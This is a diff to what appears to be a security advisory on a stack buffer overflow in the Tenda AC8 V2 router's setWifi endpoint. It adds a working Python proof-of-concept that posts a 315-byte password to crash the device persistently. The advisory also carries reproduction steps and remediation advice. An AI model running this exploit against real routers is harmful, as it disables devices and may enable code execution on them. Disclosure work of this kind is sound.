@@ -12,6 +12,7 @@ A stack-based buffer overflow vulnerability exists in the `goform/setWifi` HTTP 
 - **CWE:** CWE-121 (Stack-based Buffer Overflow), CWE-787 (Out-of-bounds Write), CWE-20 (Improper Input Validation)
 - **Attack vector:** Network — standard HTTP POST to the device's admin interface (`goform/setWifi`). Exploitable from the LAN by default; exploitable remotely over the internet on any unit with WAN/remote management enabled, as the endpoint has no transport-layer restriction beyond normal HTTP(S) access to the management interface
 - **Impact:** Denial of Service (persistent, requires hardware-level recovery); potential Remote Code Execution (PC/RA fully attacker-controlled)
+- **CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CRITICAL)
 
 ## Affected Component
 
@@ -41,6 +42,7 @@ A stack-based buffer overflow vulnerability exists in the `goform/setWifi` HTTP 
 ![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/TLB.png)
 
 ### Evidence of NVRAM Persistence and Corruption
+![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/UART_.jpg)
 
 Serial console boot log confirms the configuration storage layout and shows checksum verification failures on both the primary and mirrored NVRAM blocks following the oversized write:
 
@@ -83,6 +85,85 @@ A secondary exception immediately follows as the exception handler itself attemp
 
 1. Authenticate to the Tenda AC8 V2 web management interface or use the base 64 `ecos_pw` of intercepted request.
 2. Submit a `POST /goform/setWifi` request with the `wifiPwd` parameter set to an oversized value (315+ bytes of a fixed byte, e.g. `0x41`).
+   - Refer to this python script:
+```
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Replace BASE64PASSWORD with base64(admin_password)
+# e.g. base64.b64encode(b'yourpassword').decode()
+cookies = {
+    'bLanguage': 'en',
+    'ecos_pw': 'BASE64PASSWORD=',
+    'language': 'cn',
+}
+
+headers = {
+    'Host': '192.168.0.1',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Accept': '*/*',
+    'Origin': 'http://192.168.0.1',
+    'Referer': 'http://192.168.0.1/index.html',
+    'Connection': 'keep-alive',
+}
+
+data = {
+    'module1': 'wifiBasicCfg',
+    'doubleBandUnityEnable': 'false',
+    'wifiTotalEn': 'true',
+    'wifiEn': 'true',
+    'wifiSSID': 'tenda',
+    'wifiSecurityMode': 'WPAWPA2/AES',
+    'wifiPwd': 'A' * 315,  # 315 bytes — overflows stack buffer, smashes RA and PC
+    'wifiHideSSID': 'false',
+    'wifiEn_5G': 'true',
+    'wifiSSID_5G': 'tenda_5G',
+    'wifiSecurityMode_5G': 'WPAWPA2/AES',
+    'wifiPwd_5G': 'changeme',
+    'wifiHideSSID_5G': 'false',
+    'module2': 'wifiGuest',
+    'guestEn': 'false',
+    'guestEn_5G': 'false',
+    'guestSSID': 'Tenda_VIP',
+    'guestSSID_5G': 'Tenda_VIP_5G',
+    'guestPwd': '',
+    'guestPwd_5G': '',
+    'guestValidTime': '8',
+    'guestShareSpeed': '0',
+    'module3': 'wifiPower',
+    'wifiPower': 'high',
+    'wifiPower_5G': 'high',
+    'module5': 'wifiAdvCfg',
+    'wifiMode': 'bgn',
+    'wifiChannel': 'auto',
+    'wifiBandwidth': 'auto',
+    'wifiMode_5G': 'ac',
+    'wifiChannel_5G': 'auto',
+    'wifiBandwidth_5G': 'auto',
+    'wifiAntijamEn': 'false',
+    'module6': 'wifiBeamforming',
+    'wifiBeaformingEn': 'true',
+    'module7': 'wifiWPS',
+    'wpsEn': 'true',
+}
+
+response = requests.post(
+    'http://192.168.0.1/goform/setWifi',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+    verify=False
+)
+
+print(response.status_code)
+print(response.text)
+# Expected: {"errCode":"0"} — device accepts oversized wifiPwd with no validation
+# Device will become unresponsive on next boot/NVRAM read cycle
+```
 3. Observe the server responds `{"errCode":"0"}`, indicating the value was accepted with no validation.
 4. The device becomes unresponsive shortly after (on NVRAM read/use of the corrupted value, typically on next boot or relevant service restart).
 5. Connect to the device's UART header (TX/RX/GND) at 38400 baud rate and observe the kernel exception dump confirming the corruption, as detailed above.
@@ -121,3 +202,5 @@ This lowers the practical bar for an attacker to reach the `wifiPwd` overflow de
 - Replace unbounded copy operations (e.g., `strcpy`/`sprintf`) used when reading NVRAM-stored configuration values into stack buffers with bounded equivalents (e.g., `strncpy`/`snprintf`) sized to the destination buffer.
 - Add NVRAM write-time validation to reject oversized values before they are committed to flash, independent of the HTTP-layer validation, as defense in depth.
 - Replace the base64-encoded-password cookie with a proper server-issued, random, expiring session identifier, and implement anti-CSRF tokens on all state-changing endpoints including `goform/setWifi`.
+
+
